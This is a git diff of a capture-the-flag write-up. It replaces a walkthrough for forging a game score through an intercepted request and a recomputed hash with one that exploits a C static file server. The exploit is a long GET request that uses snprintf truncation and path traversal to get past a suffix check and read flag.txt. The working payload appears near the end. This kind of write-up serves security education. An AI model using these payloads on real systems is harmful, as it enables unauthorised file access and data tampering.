@@ -5,38 +5,170 @@
 
 
 ## Approach
-1. You are given a website, the target is to play a game to have score over 300.
-2. Notice there are players with super high score, thus, all we need to do is to manipulate the score and obtain the flag.
+Download thefile, unzip, and read the code.
 
-   ![image](https://github.com/user-attachments/assets/68355a4c-4745-463a-98b6-07499b92669c)
+ ```c
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <stdio.h>
+#include <netinet/in.h>
+#include <signal.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdlib.h>
+#include <stdbool.h>
 
-3. Register and login to play the game.
+#define PORT 8000
+#define BUFFER_SIZE 1024
 
-   ![image](https://github.com/user-attachments/assets/4fca4895-074f-46da-abb0-f88cb7e9b382)
+typedef struct {
+    char *content;
+    int size;
+} FileWithSize;
 
-4. After you finish the game, The score will be updated to database via /update_score.php. Replay the game and turn on intercept. Intercept /update_score.php and ready to edit the POST request.
+bool ends_with(char *text, char *suffix) {
+    int text_length = strlen(text);
+    int suffix_length = strlen(suffix);
 
-   ![image](https://github.com/user-attachments/assets/03c34f2e-2f98-4ce5-977a-575b0eaf04ab)
+    return text_length >= suffix_length && \
+           strncmp(text+text_length-suffix_length, suffix, suffix_length) == 0;
+}
 
-5. Review sourcecode of /game.php (either Ctrl + U, or F12), find out how the hash is calculated.
+FileWithSize *read_file(char *filename) {
+    if (!ends_with(filename, ".html") && !ends_with(filename, ".png") && !ends_with(filename, ".css") && !ends_with(filename, ".js")) return NULL;
 
-   ![image](https://github.com/user-attachments/assets/559536e1-669f-4555-8930-d5f6b8c7f7ce)
+    char real_path[BUFFER_SIZE];
+    snprintf(real_path, sizeof(real_path), "public/%s", filename);
 
-6. The request body is SHA-256 hash of concatinating secretKey, username, and score.
+    FILE *fd = fopen(real_path, "r");
+    if (!fd) return NULL;
 
-    ![image](https://github.com/user-attachments/assets/16777ba1-8453-45dc-b1a0-9c6e31666bc8)
+    fseek(fd, 0, SEEK_END);
+    long filesize = ftell(fd);
+    fseek(fd, 0, SEEK_SET);
 
-7. Use online [SHA-256 calculator](https://emn178.github.io/online-tools/sha256.html) to change the hash: secretKey + username + score: *e.g. 3636f69fcc3760cb130c1558ffef5e24tuah3000*
+    char *content = malloc(filesize + 1);
+    if (!content) return NULL;
 
-   ![image](https://github.com/user-attachments/assets/7efbdac4-75d0-43da-94f8-b05f12ea6843)
+    fread(content, 1, filesize, fd);
+    content[filesize] = '\0';
 
-8. Go back to Burpsuite and change the hash correspondingly. Remember to change the score and hash in request body. Then, forward the request.
+    fclose(fd);
 
-   ![image](https://github.com/user-attachments/assets/be0db6da-8da5-4c4f-ac2c-f5b2f7fe0ef8)
+    FileWithSize *file = malloc(sizeof(FileWithSize));
+    file->content = content;
+    file->size = filesize;
+ 
+    return file;
+}
 
-10. Head to the scoreboard page to obtain the flag.
+void build_response(int socket_id, int status_code, char* status_description, FileWithSize *file) {
+    char *response_body_fmt = 
+        "HTTP/1.1 %u %s\r\n"
+        "Server: mystiz-web/1.0.0\r\n"
+        "Content-Type: text/html\r\n"
+        "Connection: %s\r\n"
+        "Content-Length: %u\r\n"
+        "\r\n";
+    char response_body[BUFFER_SIZE];
 
-    ![image](https://github.com/user-attachments/assets/d37b4e35-d713-4c69-aa10-14af4f56f756)
+    sprintf(response_body,
+            response_body_fmt,
+            status_code,
+            status_description,
+            status_code == 200 ? "keep-alive" : "close",
+            file->size);
+    write(socket_id, response_body, strlen(response_body));
+    write(socket_id, file->content, file->size);
+    free(file->content);
+    free(file);
+    return;
+}
 
-## Flag: 
-hkcert24{r3d33m_f0r_4_fr33_lunch}
+void handle_client(int socket_id) {
+    char buffer[BUFFER_SIZE];
+    char requested_filename[BUFFER_SIZE];
+
+    while (1) {
+        memset(buffer, 0, sizeof(buffer));
+        memset(requested_filename, 0, sizeof(requested_filename));
+
+        if (read(socket_id, buffer, BUFFER_SIZE) == 0) return;
+
+        if (sscanf(buffer, "GET /%s", requested_filename) != 1)
+            return build_response(socket_id, 500, "Internal Server Error", read_file("500.html"));
+
+        FileWithSize *file = read_file(requested_filename);
+        if (!file)
+            return build_response(socket_id, 404, "Not Found", read_file("404.html"));
+
+        build_response(socket_id, 200, "OK", file);
+    }
+}
+
+int main() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+
+    struct sockaddr_in server_address;
+    struct sockaddr_in client_address;
+
+    int socket_id = socket(AF_INET, SOCK_STREAM, 0);
+    server_address.sin_family = AF_INET;
+    server_address.sin_addr.s_addr = htonl(INADDR_ANY);
+    server_address.sin_port = htons(PORT);
+
+    if (bind(socket_id, (struct sockaddr*)&server_address, sizeof(server_address)) == -1) exit(1);
+    if (listen(socket_id, 5) < 0) exit(1);
+
+    while (1) {
+        int client_address_len;
+        int new_socket_id = accept(socket_id, (struct sockaddr *)&client_address, (socklen_t*)&client_address_len);
+        if (new_socket_id < 0) exit(1);
+        int pid = fork();
+        if (pid == 0) {
+            handle_client(new_socket_id);
+            close(new_socket_id);
+        }
+    }
+}
+```
+> [!NOTE]  
+> From the code we can analyse that the server:
+> - Serves static files from a `public/` directory.
+> - Only allows files with specific suffixes: `.html`, `.png`, `.css`, `.js`.
+
+The code uses `snprintf` to concatenate `public/` with the requested file name:
+   ```c
+   char real_path[BUFFER_SIZE];
+   snprintf(real_path, sizeof(real_path), "public/%s", filename);
+   ```
+The server uses a hardcoded buffer size of 1024 bytes. Specifically, this snippet is key:
+   ```c
+   #define BUFFER_SIZE 1024
+   ```
+
+If the `filename` string is **long enough**, the `real_path` buffer overflows, causing truncation. This allows bypassing the suffix restriction.
+
+To trick the server into treating `flag.txt` as a valid file, a request is crafted with an excessively long path. The final `.js` suffix gets **truncated** due to the buffer overflow:
+
+   ```plaintext
+   GET    /././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././flag.txt.js HTTP/1.1
+   ```
+> [!NOTE]
+> Here’s what happens:
+> 1. The long path fills up the `real_path` buffer.
+> 2. The `.js` suffix overflows and gets truncated.
+> 3. The server reads `public/flag.txt` and serves the flag!
+
+Here’s the full HTTP request used to exploit:
+
+![image](https://github.com/user-attachments/assets/69075c72-96cd-4964-a7a7-f7d3778d554e)
+
+Sending the request gives us the flag!
+
+![image](https://github.com/user-attachments/assets/17911b93-e248-4284-a1a5-091c3f6b39f1)
+
+##Flag
+hkcert24{bu1ld1n9_4_w3bs3rv3r_t0_s3rv3_5t4t1c_w3bp4935_1s_n0ntr1vial}
